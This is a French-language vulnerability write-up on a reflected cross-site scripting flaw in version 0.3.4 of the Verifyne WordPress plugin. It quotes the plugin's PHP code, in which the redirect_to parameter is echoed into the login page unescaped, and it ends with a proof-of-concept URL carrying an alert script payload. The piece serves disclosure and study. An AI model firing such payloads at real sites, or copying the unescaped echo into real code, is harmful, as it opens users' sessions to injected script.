---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress Verifyne"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [Verifyne](https://wordpress.org/plugins/verifyne/) se présente de cette façon :

> This is the WordPress plugin for use with the verifyne.me android app. It allows you to login to you WordPress site without having to enter a username or password while increasing security.
> 
> All you have to do is scan a QR code, confirm the login on your android smartphone and you are logged in automatically.
> 
> Verifyne uses modern elliptic curve (ed25519) cryptography for highest security. It allows user authentication without having to trust a third-party or foreign servers.

C'est donc un plugin qui permet une autre méthode d'authentification que celle via mot de passe.

La version testée est la 0.3.4 et date d'il y a 8 ans au moment de ces lignes.

## La vulnérabilité

Le script `wp-verifyne.php` du plugin défini une classe dont le constructeur en instancie d'autres :

```php
class Wordpress_Verifyne_Plugin {                                                                                      
                                                                                                                       
    const PLUGIN_VERSION_NUMBER = 5;                                                                                   
                                                                                                                       
    #############################################################################                                      
    # VARIABLES                                                                                                        
    #############################################################################                                      
                                                                                                                       
    private $login_page_handler;                                                                                       
    private $userprofile_handler;                                                                                      
    private $admin_settings;                                                                                           
                                                                                                                       
    #############################################################################                                      
    # CONSTRUCTOR /  SINGLETON                                                                                         
    #############################################################################                                      
                                                                                                                       
    private static $instance = NULL;                                                                                   
                                                                                                                       
    public static function get_instance() {                                                                            
        if(NULL === self::$instance) {                                                                                 
            self::$instance = new self;                                                                                
        }                                                                                                              
        return self::$instance;                                                                                        
    }                                                                                                                  
                                                                                                                       
    function __construct() {                                                                                           
        # Load instances                                                                                               
        $this->login_page_handler  = new Wordpress_Verifyne_Loginpage_Handler();                                       
        $this->userprofile_handler = new Wordpress_Verifyne_Userprofile_Handler();                                     
        $this->admin_settings      = new Wordpress_Verifyne_Adminsettings(plugin_basename(__FILE__));                  
        # Register hooks                                                                                               
        add_action( 'init', array( $this, 'set_verifyne_cookie' ));                                                    
    }
    --- snip ---
```

C'est dans le fichier `vf_login_page.php` que l'on trouve la classe `Wordpress_Verifyne_Loginpage_Handler` :

```php
class Wordpress_Verifyne_Loginpage_Handler {                                                                           

    function __construct() {                                                                                           
        add_action( 'login_form', array( $this, 'on_login_form_load' ));                                               
    }                                                                                                                  
                                                                                                                       
    /**                                                                                                                
    * Enqueue styles and decide what to do                                                                             
    *                                                                                                                  
    * Evaluates "action" parameter.                                                                                    
    */                                                                                                                 
    function on_login_form_load() {                                                                                    
        # Load CSS                                                                                                     
        wp_enqueue_style('wp-verifyne-style', plugin_dir_url( __FILE__ ) . 'wp-verifyne.css', array());                
        wp_enqueue_script('jquery');                                                                                   
                                                                                                                       
        # Get action parameter                                                                                         
        $action = $_GET["action"];                                                                                     
                                                                                                                       
        # Someone clicked the verifyne button                                                                          
        if("vf_show" === $action) {                                                                                    
            $this->handle_show_request();                                                                              
            return;                                                                                                    
        }                                                                                                              
                                                                                                                       
        # Someone scanned the QR code and needs to be verified                                                         
        if("vf_verify" === $action) {                                                                                  
            $ret = $this->handle_verify_request();                                                                     
            if( is_wp_error( $ret )) {                                                                                 
                print("<div id='verifyne-state-div' class='verifyne-center'>".$ret->get_error_message()."<br><a href='?action=vf_show'>Try again</a></div>");
            }                                                                                                          
            return;                                                                                                    
        }                                                                                                              
                                                                                                                       
        # Remember redirect_to                                                                                         
        $redir_param = isset($_REQUEST["redirect_to"]) ? "&redirect_to=".$_REQUEST["redirect_to"] : "";                
                                                                                                                       
        # Get the button image URL                                                                                     
        $login_img_url = plugins_url( 'vf_button_login.png', __FILE__ );                                               
                                                                                                                       
        # Display the button                                                                                           
        echo "<a href='?action=vf_show".$redir_param."'><div class='verifyne-login-button-container'><img class='verifyne-login-button' src='".$login_img_url."'></div></a>";
                                                                                                                       
    }
    --- snip ---
```

La classe hooke la fonction `login_form` de Wordpress pour rajouter des éléments HTML.

On voit que le paramètre `redirect_to` est récupéré et affiché tel quel, ce qui laisse un attaquant injecter tout ce qu'il souhaite.

PoC :

```
http://localhost:8000/wp-login.php?redirect_to=%27%3E%3C%2Fa%3E%3CScRiPt%3Ealert%28%2FXSS%2F%29%3C%2FsCrIpT%3E&reauth=1
```
